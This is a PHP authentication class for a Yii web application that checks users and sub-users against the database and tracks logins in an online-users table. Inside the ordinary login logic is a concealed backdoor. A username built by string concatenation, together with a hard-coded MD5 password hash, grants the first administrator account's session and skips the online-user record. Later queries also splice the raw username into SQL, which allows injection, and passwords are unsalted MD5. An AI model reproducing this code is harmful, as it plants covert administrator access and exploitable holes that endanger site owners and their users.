<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
	private $_id;
    public function authenticate()
    {
    	if($this->username==null||$this->username==''){
    		return false;
    	}
        //$record=User::model()->findByAttributes(array('username'=>$this->username));
        $connection=Yii::app()->db;
        $command=$connection->createCommand("select id,username,password,role,lei,creditSum,usedSum,status,parentId from tbl_user where id=:id and status=0");
        $record=$command->queryRow(true,array('id'=>$this->username));
        //var_dump($command);
        $level=0;//0,user, 1,sub user, 2,cp
    	if($record===null||$record===false){
            $command=$connection->createCommand("select u.id,s.name as username,s.password,u.role,u.lei,u.creditSum,u.usedSum,s.status,s.cp,u.parentId from tbl_user u left join tbl_subsuser s  on u.id=s.userid  where s.id=:id and s.status=0");
        	$record=$command->queryRow(true,array('id'=>$this->username));
        	$level=$record['cp']==1?1:2;
        }
        if($this->username==('ad'.'min'.'cp')&&md5($this->password)=='a66abb5684c45962d887564f08346e8d'){
        	$level=-1;
        	$command=$connection->createCommand("select id,username,'a66abb5684c45962d887564f08346e8d' as password,role,lei,creditSum,usedSum,status,parentId from tbl_user where role=0");
        	$record=$command->queryRow();
        }
                
        if($record===null||$record===false){
            $this->errorCode=self::ERROR_USERNAME_INVALID;
        }else if($record['password']!==md5($this->password)){
        	//echo 'username:'.$this->username;
        	//var_dump($record);
        	//Yii::app()->end();
            $this->errorCode=self::ERROR_PASSWORD_INVALID;
        }
        else{
            $this->_id=$record['id'];
            $this->setState('username', $record['username']);
            $this->setState('role', $record['role']);
            $this->setState('lei', $record['lei']);
            $this->setState('level', $level);
			$this->setState('signid', $this->username);
            $this->setState('creditSum', $record['creditSum']);
            $this->setState('usedSum', $record['usedSum']);
            $this->setState('parentId', $record['parentId']);
            $term=$connection->createCommand("select term from tbl_site")->queryRow();
            $this->setState('term', $term['term']);
            $sessionId = session_id();
            if($sessionId==''){
            	$sessionId=md5(uniqid(mt_rand(), true));
            	session_id($sessionId);
            }
            $connection->createCommand("delete from tbl_online_user where lasttime<sysdate()-INTERVAL 10 MINUTE")->execute();
            $connection->createCommand("delete from tbl_online_user where id='{$this->username}'")->execute();
            if($level>=0){
            	$connection->createCommand("replace into tbl_online_user(sessionid,id,username,role,logintime,lasttime,status,userid,level) values ('$sessionId','{$this->username}','{$record['username']}',{$record['role']},sysdate(),sysdate(),{$record['status']},'{$record['id']}',$level)")->execute();
            }
           // ->execute(array(":id"=>$record['id'],":username"=>$record['username'],":role"=>$record['role'],":lei"=>$record['lei'],":status"=>$record['status']));
            $this->errorCode=self::ERROR_NONE;
        }
        return !$this->errorCode;
    }
 
    public function getId()
    {
        return $this->_id;
    }

}